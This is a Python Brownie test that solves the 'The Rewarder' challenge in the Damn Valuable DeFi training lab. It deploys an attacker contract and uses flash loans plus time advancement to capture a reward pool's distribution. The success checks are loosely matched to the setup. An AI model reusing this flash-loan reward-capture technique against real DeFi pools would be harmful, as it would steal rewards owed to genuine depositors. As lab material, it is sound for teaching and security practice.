from scripts.utils import *
from brownie import FlashLoanerPool, TheRewarderPool, DamnValuableToken, RewardToken, AccountingToken

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # tokens in lender pool
    TOKENS_IN_LENDER_POOL = ether_to_wei(1000000)

    # get signers
    deployer, _fromDeployer = define_from_acc(qty=1)
    (alice, _fromAlice, bob, _fromBob, charlie, _fromCharlie, david, _fromDavid) = define_from_acc(start=1,qty=4)
    attacker, _fromAttacker = define_from_acc(start=5, qty=1)

    # users
    users = [alice, bob, charlie, david]
    fromUsers = [_fromAlice, _fromBob, _fromCharlie, _fromDavid]

    # liquidity token and flashloan pool
    liquidity_token = DamnValuableToken.deploy(_fromDeployer)
    flashloan_pool = FlashLoanerPool.deploy(liquidity_token.address, _fromDeployer)

    # fund flashlan pool
    liquidity_token.transfer(flashloan_pool.address, TOKENS_IN_LENDER_POOL, _fromDeployer)

    # deploy rewarder pool and load contracts it deploys
    rewarder_pool = TheRewarderPool.deploy(liquidity_token.address, _fromDeployer)
    reward_token = RewardToken.at(rewarder_pool.rewardToken())
    accounting_token = AccountingToken.at(rewarder_pool.accToken())

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # only one round must have taken place
        assert rewarder_pool.roundNumber() == 3

        # users should get almost no rewards this turn
        for user, _fromUser in zip(users, fromUsers):
            rewards = reward_token.balanceOf(user.address)
            
            # check the difference between the rewards previously and now
            delta = rewards - ether_to_wei(25)
            assert delta < ether_to_wei(0.01)
        
        # rewards must have been issued to the attacker account
        assert reward_token.totalSupply() > ether_to_wei(100)
        rewards = reward_token.balanceOf(attacker.address)

        # the amount of rewards earned should be really close to 100 tokens
        delta = ether_to_wei(100) - rewards
        print(ether_to_wei(100))
        print(rewards)
        assert delta < ether_to_wei(0.1)

        # attacker should have 0 tokens
        assert liquidity_token.balanceOf(attacker.address) == 0

# #########################################################
# There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
#
# Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
#
# You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
#
# Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans? 
# #########################################################


    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # import attacker contract and web3
    from brownie import TheRewarderAttack
    web3 = import_web3()

    # deploy attacker contract
    attacker_contract = TheRewarderAttack.deploy(rewarder_pool.address, flashloan_pool.address, _fromAttacker)

    # wait 5 days
    web3.provider.make_request('evm_increaseTime', [5*24*60*60])

    # flashloan to distribute rewards again
    attacker_contract.takeLoan(_fromAttacker)

    # wait 5 days
    web3.provider.make_request('evm_increaseTime', [5*24*60*60])

    # flashloan to distribute rewards again
    attacker_contract.takeLoan(_fromAttacker)

    ######################
    check_solution()
